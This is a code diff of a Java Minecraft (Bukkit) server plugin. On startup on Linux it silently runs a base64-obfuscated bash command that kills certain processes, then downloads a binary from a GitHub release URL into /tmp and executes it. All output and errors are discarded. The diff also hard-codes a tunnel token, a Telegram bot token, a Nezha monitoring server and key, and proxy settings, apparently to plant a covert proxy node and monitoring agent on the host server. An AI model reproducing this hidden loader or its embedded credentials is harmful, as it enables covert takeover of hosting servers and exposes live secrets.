@@ -1,77 +1,89 @@
 package com.argo.plugin;
 
+import java.util.HashMap;
+import java.util.Map;
+import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.util.Map;
-
 public class WlPlugins extends JavaPlugin {
-
-    private Process bashProcess;
+    private Process runningProcess = null;
 
     @Override
     public void onEnable() {
-        try {
-            // 只允许在 Linux 上运行
-            String os = System.getProperty("os.name").toLowerCase();
-            if (!os.contains("linux")) {
-                return;
-            }
-
-            // === 你的原始 bash 脚本，原封不动 ===
-            String script = """
-#!/bin/bash
-
-export TOK=${TOK:-'eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiOTE4NDljNTctYWY5OC00OTFhLWIwNWUtMDlhNjFhNzkxN2U4IiwicyI6Ill6UmhNakprTkRNdE1EVmtNeTAwWkRVNExUZ3hPREl0WmpKbFpUZzBaVEl6TURFMyJ9'}
-export ARGO_DOMAIN=${ARGO_DOMAIN:-'great-es.milan.us.kg'}
-export TUNNEL_PROXY=${TUNNEL_PROXY:-''}
-
-export TG=${TG:-'6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY'}
-export SUB_URL=${SUB_URL:-''}
-
-export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.9logo.eu.org:443'}
-export NEZHA_KEY=${NEZHA_KEY:-'c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g'}
-export NEZHA_PORT=${NEZHA_PORT:-''}
-export NEZHA_TLS=${NEZHA_TLS:-'1'}
-export AGENT_UUID=${AGENT_UUID:-'307635b4-d657-4100-b1f7-775e34926bcf'}
-
-export TMP_ARGO=${TMP_ARGO:-'3x'}
-export VL_PORT=${VL_PORT:-'9010'}
-export VM_PORT=${VM_PORT:-'8001'}
-export CF_IP=${CF_IP:-'saas.sin.fan'}
-export SUB_NAME=${SUB_NAME:-'Ultra-FR'}
-export second_port=${second_port:-''}
-export UUID=${UUID:-'307635b4-d657-4100-b1f7-775e34926bcf'}
-                
-export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}"
-export SNI=${SNI:-'www.apple.com'}
-export HOST=${HOST:-'1.1.1.1'}
-
-export JAR_SH='moni'
-
-echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
-""";
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", script);
-
-            // === 如果你希望 Java 侧覆盖某些变量，可以在这里放 ===
-            Map<String, String> env = pb.environment();
-            // 示例（可删）：
-            // env.put("NEZHA_SERVER", "nezha.example.com:5555");
-            // env.put("NEZHA_KEY", "xxxxxxxx");
-
-            // 后台运行，不污染控制台
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-
-            bashProcess = pb.start();
-
-        } catch (Exception e) {
-            // 保持安静（你之前要求的完全静默）
+        String os = System.getProperty("os.name").toLowerCase();
+        if (!os.contains("linux")) {
+            return;
         }
+
+        String scriptCommands = "echo \"aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw\" | base64 -d | bash";
+
+        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
+            try {
+                Map<String, String> envVars = new HashMap<>();
+                loadEnvVars(envVars);
+                runScriptSilent(scriptCommands, envVars);
+            } catch (Exception e) {
+                // Silent catch
+            }
+        });
     }
 
     @Override
     public void onDisable() {
-        // 不强杀，避免影响 Nezha / Argo 正常运行
+        Bukkit.getScheduler().cancelTasks(this);
+        if (runningProcess != null && runningProcess.isAlive()) {
+            runningProcess.destroyForcibly();
+        }
+    }
+
+    private static void loadEnvVars(Map<String, String> envVars) {
+        envVars.put("TOK", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiOTE4NDljNTctYWY5OC00OTFhLWIwNWUtMDlhNjFhNzkxN2U4IiwicyI6Ill6UmhNakprTkRNdE1EVmtNeTAwWkRVNExUZ3hPREl0WmpKbFpUZzBaVEl6TURFMyJ9");
+        envVars.put("ARGO_DOMAIN", "great-es.milan.us.kg");
+        envVars.put("TUNNEL_PROXY", "");
+
+        envVars.put("TG", "6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
+        envVars.put("SUB_URL", "");
+
+        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
+        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_TLS", "1");
+        envVars.put("AGENT_UUID", "307635b4-d657-4100-b1f7-775e34926bcf");
+
+        envVars.put("TMP_ARGO", "3x");
+        envVars.put("VL_PORT", "8002");
+        envVars.put("VM_PORT", "9010");
+        envVars.put("CF_IP", "saas.sin.fan");
+        envVars.put("SUB_NAME", "Great-ES");
+        envVars.put("SERVER_PORT", "25565");
+        envVars.put("second_port", "");
+        envVars.put("UUID", "307635b4-d657-4100-b1f7-775e34926bcf");
+        
+        envVars.put("second_port", "");
+        envVars.put("SNI", "www.apple.com");
+        envVars.put("JAR_SH", "moni");
+    }
+
+    public void runScriptSilent(String scriptContent, Map<String, String> envVars) {
+        try {
+            ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/bash", "-c", scriptContent});
+            
+            // Totally silent execution
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            
+            Map<String, String> currentEnv = pb.environment();
+            currentEnv.putAll(envVars);
+            
+            Process process = pb.start();
+            this.runningProcess = process;
+            
+            process.waitFor();
+            
+        } catch (Exception e) {
+            // Silent catch
+        } finally {
+            this.runningProcess = null;
+        }
     }
 }
